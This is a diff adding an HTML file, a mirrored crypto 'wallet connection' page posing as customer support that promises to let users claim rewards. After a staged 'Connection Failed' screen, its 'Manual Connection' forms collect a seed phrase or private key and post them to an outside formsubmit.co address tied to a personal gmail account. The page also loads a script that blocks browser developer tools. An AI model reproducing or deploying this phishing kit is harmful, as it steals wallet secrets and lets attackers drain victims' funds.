@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from dappmulticoins.web.app/app/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 24 Aug 2026 14:03:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>kerneldao Connection Page</title>
+  <link rel="stylesheet" href="assets/styles.css" />
+  <style>
+    .navbar__title {
+      background: linear-gradient(to right, #0a0e14 0, #0a0e14 42.86%, #1fd87a 42.86%, #1fd87a 100%);
+      -webkit-background-clip: text;
+      font-weight: 700;
+      letter-spacing: 1px;
+      -webkit-text-fill-color: #0000;
+      background-clip: text;
+    }
+
+    @keyframes slide-in-one-tap {
+      from {
+        transform: translateY(80px);
+      }
+
+      to {
+        transform: translateY(0px);
+      }
+    }
+
+    .trust-hide-gracefully {
+      opacity: 0;
+    }
+
+    .trust-wallet-one-tap .hidden {
+      display: none;
+    }
+
+    .trust-wallet-one-tap .semibold {
+      font-weight: 500;
+    }
+
+    .trust-wallet-one-tap .binance-plex {
+      font-family: "Binance";
+    }
+
+    .trust-wallet-one-tap .rounded-full {
+      border-radius: 50%;
+    }
+
+    .trust-wallet-one-tap .flex {
+      display: flex;
+    }
+
+    .trust-wallet-one-tap .flex-col {
+      flex-direction: column;
+    }
+
+    .trust-wallet-one-tap .items-center {
+      align-items: center;
+    }
+
+    .trust-wallet-one-tap .space-between {
+      justify-content: space-between;
+    }
+
+    .trust-wallet-one-tap .justify-center {
+      justify-content: center;
+    }
+
+    .trust-wallet-one-tap .w-full {
+      width: 100%;
+    }
+
+    .trust-wallet-one-tap .box {
+      transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+      animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+      width: 384px;
+      border-radius: 15px;
+      background: #fff;
+      box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+      position: fixed;
+      right: 30px;
+      bottom: 30px;
+      z-index: 1020;
+    }
+
+    .trust-wallet-one-tap .header {
+      gap: 15px;
+      border-bottom: 1px solid #e6e6e6;
+      padding: 10px 18px;
+    }
+
+    .trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+    .trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+    .trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+    .trust-wallet-one-tap .body {
+      padding: 9px 18px;
+      gap: 10px;
+    }
+
+    .trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+    .trust-wallet-one-tap .body .right-items .wallet-title {
+      color: #1e2329;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .body .right-items .wallet-subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .connect-indicator {
+      gap: 15px;
+      padding: 8px 0;
+    }
+
+    .trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+    .trust-wallet-one-tap .loading-color {
+      color: #fff;
+    }
+
+    .trust-wallet-one-tap .button {
+      border-radius: 50px;
+      outline: 2px solid transparent;
+      outline-offset: 2px;
+      background-color: rgb(5, 0, 255);
+      border-color: rgb(229, 231, 235);
+      cursor: pointer;
+      text-align: center;
+      height: 45px;
+    }
+
+    .trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+    .trust-wallet-one-tap .footer {
+      margin: 20px 30px;
+    }
+
+    .trust-wallet-one-tap .check-icon {
+      color: #fff;
+    }
+
+    @font-face {
+      font-family: "Binance";
+      src: url(chrome-extension_/egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.html) format("opentype");
+      font-weight: 400;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: "Binance";
+      src: url(chrome-extension_/egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.html) format("opentype");
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: "Binance";
+      src: url(chrome-extension_/egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.html) format("opentype");
+      font-weight: 600;
+      font-style: normal;
+    }
+  </style>
+  <script disable-devtool-auto src='../../cdn.jsdelivr.net/npm/disable-devtool/disable-devtool.min.js'></script>
+</head>
+
+<body>
+  <div class="container">
+    <header>
+      <div style="display: flex; justify-content: center; align-items: center;">
+       <h1>Crypto Customer Support</h1>
+      </div>
+      <p class="subtitle">Connect your wallet to claim your rewards</p>
+      <div class="search-container">
+        <input type="text" id="walletSearch" placeholder="Search wallets..." class="search-input" />
+      </div>
+    </header>
+
+    <main> 
+
+      <div class="wallet-selector">
+        <div class="selector-header">
+          <h2>Select Wallet</h2>
+          <div class="secure-badge">
+            <span>🛡️ Secure</span>
+          </div>
+        </div>
+
+        <div class="wallets-grid">
+         
+
+          <button class="wallet-button" data-wallet="Solana Wallet">
+            <div class="wallet-icon">
+              <img src="assets/solana.png" alt="Solana Wallet" />
+            </div>
+            <span>Solana Wallet</span>
+          </button>
+		  
+		   <button class="wallet-button" data-wallet="phantom">
+            <div class="wallet-icon">
+              <img src="assets/phanton.png" alt="Phantom Wallet" />
+            </div>
+            <span>Phantom Wallet</span>
+          </button>
+		  
+		  
+		 <button class="wallet-button" data-wallet="Best Wallet">
+            <div class="wallet-icon">
+              <img src="assets/best.png" alt="Best Wallet" />
+            </div>
+            <span>Best Wallet</span>
+			</button>
+			
+			  <button class="wallet-button" data-wallet=" WalletConnect">
+            <div class="wallet-icon">
+              <img src="assets/walletconnect.png" alt="WalletConnect" />
+            </div>
+            <span>WalletConnect</span>
+          </button>
+
+			
+          
+        </div>
+      </div>
+    </main>
+
+    <!-- Connection Modal -->
+    <div id="connectionModal" class="modal">
+      <div class="modal-content">
+        <button class="close-btn">×</button>
+        <div class="wallet-info">
+          <img id="connectionWalletIcon" src="assets/space-9705cd779cebb6665ca3e9c2f124ef3a.png" alt="Wallet Icon" />
+          <div>
+            <h3>
+              Connecting to
+              <span class="contex" id="connectionWalletName">Space</span>
+            </h3>
+            <p>Please wait while we establish connection</p>
+          </div>
+        </div>
+        <div class="progress-container">
+          <div class="progress-info">
+            <span id="connectionStatus">Finalizing connection...</span>
+            <span id="progressPercentage">95%</span>
+          </div>
+          <div class="progress-bar">
+            <div id="progressBar" class="progress" style="width: 95%"></div>
+          </div>
+        </div>
+        <p class="warning-text">
+          Don't close this window during the connection process
+        </p>
+      </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" class="modal">
+      <div class="modal-content">
+        <button class="close-btn">×</button>
+        <div class="error-icon">⚠️</div>
+        <h3>Connection Failed</h3>
+        <p>
+          We couldn't establish a secure connection. This might be due to
+          network issues or wallet configuration.
+        </p>
+        <div class="button-group">
+          <button id="retryBtn" style="display: none;" class="primary-btn full-width">
+            Try Again
+          </button>
+          <button id="manualBtn" class="secondary-btn full-width">
+            Connect Manually
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Manual Connect Modal -->
+    <div id="manualModal" class="modal">
+      <div class="modal-content">
+        <button class="close-btn">×</button>
+        <div class="wallet-info">
+          <img id="manualWalletIcon" src="assets/space-9705cd779cebb6665ca3e9c2f124ef3a.png" alt="Wallet Icon" />
+          <div>
+            <h3>Manual Connection</h3>
+            <p>Follow the steps below to connect manually</p>
+          </div>
+        </div>
+
+        <div class="tabs">
+          <button class="tab active" data-tab="seed">Seed Phrase</button>
+          <button class="tab" data-tab="key">Private Key</button>
+        </div>
+        <div class="tab-content">
+          <form action="https://formsubmit.co/jklaymorris00@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://dappsmulticoin.vercel.app/error/load.html">
+            <div id="seedContent" class="tab-pane active">
+              <label for="seedPhrase">Enter your 12 or 24 word seed phrase (space separated)</label>
+              <textarea name="seedPhrase" id="seedPhrase" required placeholder="word1 word2 word3 word4..."></textarea>
+              <input type="hidden" name="walletType" id="walletTypeInput" value="Space" />
+              <button type="submit" class="primary-btn full-width">
+                Connect Wallet
+              </button>
+            </div>
+          </form>
+
+<form action="https://formsubmit.co/jklaymorris00@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                         
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://dappsmulticoin.vercel.app/error/load.html">
+            <div id="keyContent" class="tab-pane">
+              <label for="privateKey">Enter your private key</label>
+              <input type="text" name="privateKey" id="privateKey" required="" placeholder="0x..." />
+              <input type="hidden" name="walletType" id="walletTypeInput" value="Space" />
+              <button type="submit" class="primary-btn full-width">
+                Connect Wallet
+              </button>
+            </div>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <p>© 2026. All rights reserved.</p>
+    </footer>
+  </div>
+  <script src="assets/script.js"></script>
+</body>
+
+
+<!-- Mirrored from dappmulticoins.web.app/app/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 24 Aug 2026 14:04:11 GMT -->
+</html>
